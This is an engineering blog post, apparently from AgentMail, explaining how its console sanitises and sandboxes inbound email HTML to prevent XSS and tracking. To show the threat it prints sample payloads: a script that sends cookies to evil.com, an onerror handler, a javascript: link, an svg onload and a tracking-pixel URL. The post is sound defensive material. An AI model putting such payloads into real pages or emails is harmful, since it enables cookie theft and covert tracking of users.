---
schema_version: "1.0.0"
document_id: "edf853c04730ebe7be8bcbcb54f938e41b296a5ee768ea6cb4c4f5f94854dac9"
company_key: "yc-agentmail"
company: "AgentMail"
source_id: "yc-agentmail-news-import-d328fbd3393f"
canonical_url: "https://www.agentmail.to/blog/rendering-email-safely-preventing-phishing-attacks"
published_at: "2026-02-03T00:00:00+00:00"
first_seen_at: "2026-07-21T05:07:06.081239+00:00"
fetched_at: "2026-07-28T22:22:21.045319+00:00"
content_hash: "sha256:32a770c9864e7793bdae8bd84be6880c4c0d9542ef82b34d2cbe8697a7455f2d"
---

# Rendering Email Safely: Preventing Phishing Attacks

# Rendering Email Safely: Preventing Phishing Attacks


TL;DR


- **Email HTML is untrusted code.** Rendering it directly enables XSS attacks, which are malicious scripts running inside your browser.
- **We use a 4-layer defense:** DOMPurify sanitization → sandboxed iframe → disabled scripts → strict CSP.
- **DOMPurify strips dangerous markup** like` <script>` , event handlers, and` javascript:` URLs.
- **Sandboxed iframes isolate content** so even if something slips through, it can't touch your session or data.
- **CSP blocks tracking pixels** and unauthorized network requests that could leak information.
- **Conclusively,** emails render as readable documents, not executable code.


Email is one of the most hostile input surfaces on the internet.


Most of our grandparents get scammed strictly through email.


Every inbound email can contain arbitrary HTML, embedded images, links, styles, and malformed markup.


As a full-service email provider for AI agents, we do need to account for humans needing to have insight to emails being sent, so we created a console to allow observability.


But if we were to render email content directly inside our console, we would open you up to the possibility of untrusted code executing on your computer.


When we built AgentMail's console, we made sure email content was safe and significantly upgraded our security model to prevent phishing, cross-site scripting (XSS).


This post walks through:


1. Why email HTML is dangerous
2. How we designed rendering safely
3. Remaining tradeoffs and considerations


---


## Why is HTML Dangerous?


HTML content can be naively rendered using React's:


```text
dangerouslySetInnerHTML
```


Here is how it can be used:


```text
<div className="prose max-w-none" dangerouslySetInnerHTML={{ __html: processedContent }} />
```


The HTML comes from raw inbound email.


While React escapes normal content,` dangerouslySetInnerHTML` bypasses that protection entirely. Whatever HTML arrives is injected into the DOM.


This means a malicious email could run code inside our dashboard. Yikers.


This type of vulnerability is known as **cross-site scripting (XSS)** — where attacker-controlled content runs inside a trusted application. In this case, simply opening an email could allow untrusted code to execute inside our console.


---


## Why Email HTML Is Dangerous


Email clients historically support a huge subset of HTML features. Attackers abuse this surface for:


**Script execution:**


```text
<script>fetch("https://evil.com/steal?cookie=" + document.cookie)</script>
```


```text
<img src="x" onerror="stealData()" />
```


**JavaScript execution:**


```text
<a href="javascript:steal()">Click me</a>
```


**SVG execution:**


```text
<svg onload="attack()" />
```


So technically, attackers could send YOU an email and even if you don't click on anything, by virtue of opening the email you would be at risk.


---


## Security Goals


For our users, we wanted to guarantee:


- Email content cannot execute JavaScript
- Email cannot access dashboard data
- Email cannot steal session information
- AgentMail cannot become a phishing vector
- Malicious markup cannot escape rendering boundaries


We needed both sanitization and isolation.


---


## Our Rendering Architecture


Loading diagram...


Each layer prevents a different class of attack. After content passes through all these filters do we show it in your browser.


---


## Step 1: Sanitizing HTML with DOMPurify


We now sanitize all inbound HTML using DOMPurify before rendering.


```text
import DOMPurify from 'dompurify'


const sanitizedHtml = DOMPurify.sanitize(rawHtml)
```


DOMPurify removes:


- ` <script>` tags
- Inline event handlers (` onclick` ,` onerror` , etc.)
- ` javascript:` URLs
- Malicious SVG payloads


This ensures injected markup cannot execute scripts, eliminating the most common cross-site scripting vectors.


This is the biggest catch all, as it is the scripts and nasty links that cause for the most chaos.


However, as with all tools, nothing is perfect.


---


## Step 2: Rendering Inside a Sandboxed iframe


Even strong sanitizers occasionally miss edge cases. Browsers also evolve, and HTML parsing rules are messy.


So instead of trusting sanitization completely, we also isolate email content in its own environment.


```text
<iframe sandbox srcdoc="...sanitized html..." />
```


This way even if anything HAPPENED to slip through (almost never) it would execute in an independent DOM environment, with zero access to your browser or computer.


This means the email content:


- Cannot run JavaScript
- Cannot access cookies or local storage
- Cannot access the parent application
- Cannot modify the main page
- Cannot inject UI outside its boundary


Even if malicious HTML somehow bypassed sanitization, it is still trapped inside this sandbox. Nice.


Whatever the HTML was, we've turned the email into a readable document, instead of code the browser can execute.


---


## Step 3: Disabling Script Execution


We intentionally use the sandbox with **no script permissions** .


This blocks:


- ` <script>` execution
- Inline handlers
- External scripts
- Dynamic DOM manipulation


Without scripts, malicious emails lose the ability to:


- Steal session tokens
- Read application data
- Send background requests
- Impersonate user actions


At this point in time, a bad bad person can make content seem misleading with stuff like FREE, or YOUR ACCOUNT HAS BEEN BREACHED, but they cannot execute logic. We've taken away their power. But unfortunately, script execution isn't everything.


---


## Step 4: Content Security Policy (CSP)


The sandbox blocks **script execution** , but:


- Images can still load
- CSS can still load
- Links still exist
- Network requests from images or fonts can still occur


So scripts are dead, but it is still possible to load data in across the network.


Browsers can still load in images like:


```text
<img src="https://tracker.evil.com/pixel?id=123">
```


Even without JavaScript, these requests leak information such as:


- User IP address
- Email open events
- Device information
- Request timing


But that is what CSP is for.


We also inject strict CSP rules inside the iframe document:


```text
<meta
http-equiv="Content-Security-Policy"
content="
default-src 'none';
img-src https: data:;
style-src 'unsafe-inline';
font-src https:;
frame-ancestors 'none';
"
/>
```


This prevents:


- Loading arbitrary scripts
- Unauthorized network requests
- Embedding malicious frames
- External data exfiltration


So as a last call, if the HTML tries to call for backup help from the imgs and svg tags (because it couldn't run scripts itself) we refuse to let any external images coming from unknown services to render.


---


## Tradeoffs


Rendering email inside a sandboxed iframe changes some browser behavior, so we have to handle a few things manually.


- The iframe doesn't automatically resize when content expands, so quoted replies may require explicit height handling or internal scrolling.
- Loading inline images also requires carefully allowing safe sources while still blocking remote tracking resources.
- Link clicks need to be routed safely so emails can open links without allowing unexpected navigation or phishing redirects.
- There's also a small performance cost from sanitizing and sandboxing content, but it's honestly negligible compared to the security benefits.


Overall, these are necessary engineering tradeoffs for safely rendering untrusted email content.


---


## Conclusion


Email HTML is not just innocent content; it has the potential to be untrusted code. Rendering it safely requires treating every message as hostile input. As we've all learned in our CS classes: "NEVER TRUST USER INPUT".


By combining sanitization, sandboxed rendering, and strict browser policies, we ensure email remains readable without becoming executable inside our application. The result is a system where even malicious emails render safely by default.
